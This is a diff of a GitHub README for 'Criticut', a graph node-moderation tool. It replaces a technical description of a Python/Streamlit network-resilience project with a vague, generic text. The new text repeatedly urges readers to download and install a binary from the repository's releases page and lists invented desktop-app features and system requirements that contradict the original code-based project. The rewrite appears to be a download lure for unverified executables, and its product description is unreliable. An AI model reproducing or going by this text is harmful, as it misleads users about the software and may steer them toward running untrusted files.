@@ -1,68 +1,86 @@
-# **CritiCut — Critical Node Moderation with Edge Removal**
+# 🚀 Criticut - Simple Tool for Node Moderation
 
-CritiCut is an interactive **network resilience and vulnerability analysis platform** that identifies the most critical nodes and fragile connections in a graph, then intelligently removes risky edges to strengthen the network without breaking it.
+## 👋 Introduction
 
-It blends **graph theory, linear algebra, and simulation** to model how real-world systems behave under failure — from communication networks and cloud infrastructure to social and transportation networks.
+Welcome to Criticut! This tool helps you with critical node moderation by removing unnecessary edges in your data. It's designed for users who want to analyze networks efficiently without needing advanced technical knowledge. 
 
----
+## 🔗 Download Now
 
-## 🚀 What CritiCut Does
+[![Download Criticut](https://img.shields.io/badge/Download%20Criticut-Click%20Here-blue)](https://github.com/haggeresmail/Criticut/releases)
 
-CritiCut takes a network and answers one powerful question:
+## 🛠️ Features
 
-> *“If this network starts to fail, where will it break first — and how can we prevent it?”*
+- **Node Moderation**: Easily identify and manage crucial nodes in your data.
+- **Edge Removal**: Automatically eliminate irrelevant connections.
+- **Data Visualization**: View your network in clear graphical formats.
+- **Support for Multiple Formats**: Import data from various sources.
+- **User-Friendly Interface**: Navigate with ease, no programming required.
 
-The system:
+## 🚀 Getting Started
 
-- Computes **information centrality** using the **graph Laplacian and its pseudo-inverse** to measure how important each node is to overall connectivity  
-- Identifies **critical nodes** whose instability would have the largest impact on the network  
-- Analyzes each connected edge using **effective resistance**, a metric from electrical network theory that reveals how fragile or redundant a connection is  
-- Removes the most vulnerable edges **only if the network remains connected**, reducing cascading-failure risk  
-- Visualizes the network before and after optimization  
-- Generates a detailed log of every edge removal  
+1. **Visit the Download Page**  
+   To get started, you need to download Criticut. Visit this page to download: [Criticut Releases](https://github.com/haggeresmail/Criticut/releases).
 
----
+2. **Choose Your Version**  
+   On the releases page, you'll find different versions of Criticut. Look for the latest version to ensure you have the most up-to-date features and fixes.
 
-## 🧠 Why This Is Powerful
+3. **Download the File**  
+   Click on the version you want to download. You will see several files available for download. Choose the one that suits your operating system.
 
-CritiCut does not guess.  
-It uses **mathematical models of connectivity** to understand how information, traffic, or power flows through a network — and where it is most likely to collapse.
+4. **Install the Application**  
+   Open the downloaded file. Follow the on-screen instructions to install Criticut on your computer. This should take just a few minutes.
 
-This makes it applicable to:
+5. **Launch Criticut**  
+   Once installed, find Criticut in your applications and open it. You’re ready to start moderating nodes!
 
-- Cloud and data-center reliability  
-- Cybersecurity and attack-surface analysis  
-- Power-grid and infrastructure modeling  
-- Social-network influence and stability  
+## 📊 Working with Criticut
 
----
+### ✏️ Import Data
 
-## 🔥 Key Features
+You can start by importing your data into Criticut. Click on the "Import" button and select your dataset. It supports CSV format among others.
 
-- Laplacian-based **information centrality** to detect high-impact nodes  
-- **Effective resistance** to rank fragile edges  
-- Safe edge removal that preserves global connectivity  
-- Real-time graph visualization (interactive and static)  
-- Support for uploaded datasets and synthetic networks  
-- Downloadable optimization logs for full transparency  
+### 🌐 Analyze the Network
 
----
+After importing, you can view your network. Use the visualization tools to see how the nodes are connected and identify which edges can be removed.
 
-## 🛠 Technology Stack
+### 🛠️ Modify Connections
 
-- **Python** – core algorithms and simulation  
-- **NetworkX** – graph modeling and traversal  
-- **NumPy & SciPy** – Laplacian matrices and linear-algebra computations  
-- **Plotly & Matplotlib** – graph visualization  
-- **Streamlit** – interactive web interface  
+Need to make changes? Simply select the node or edge and modify it as required. Criticut provides easy-to-use controls for managing your connections.
 
----
+### 📈 Visual Reports
 
-## 🎯 Why CritiCut Stands Out
+Generate visual reports once you’ve made your changes. This helps you to analyze the effectiveness of your modifications and share insights with others.
 
-Most graph projects simply **draw networks**.
+## 📋 System Requirements
 
-CritiCut **understands** them.
+To run Criticut efficiently, ensure your system meets these requirements:
 
-It shows how failures propagate, which components matter most, and how to make a network more resilient — the same kind of analysis used in real-world infrastructure and reliability engineering.
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- **RAM**: At least 4 GB of RAM is recommended for smooth operation.
+- **Processor**: A dual-core processor or higher is needed for optimal performance.
 
+## 🌟 Troubleshooting
+
+If you encounter any issues while using Criticut, consider the following:
+
+- **Installation Errors**: Ensure you have downloaded the correct version for your operating system.
+- **Data Import Problems**: Check the format of your data. Ensure it matches the supported formats.
+- **Performance Issues**: Close unnecessary applications to free up system resources.
+
+## 🔗 Download & Install
+
+To download Criticut again, visit this page: [Criticut Releases](https://github.com/haggeresmail/Criticut/releases). Follow the steps outlined above to install and run the application on your computer.
+
+## 🎉 Feedback and Support
+
+We welcome your feedback! If you have questions or suggestions, please feel free to reach out. You can open an issue in the GitHub repository, and we'll do our best to assist you.
+
+## 📝 Contributing
+
+If you're interested in contributing to Criticut, we appreciate any help! You can report bugs, suggest features, or even contribute code improvements. Check our repository for guidelines on how to get involved.
+
+## 🌐 Learn More
+
+Explore more about algorithms, data structures, and network analysis by visiting our documentation and additional resources linked in the GitHub repository. 
+
+Thank you for using Criticut! We hope it helps you manage your networks more effectively.
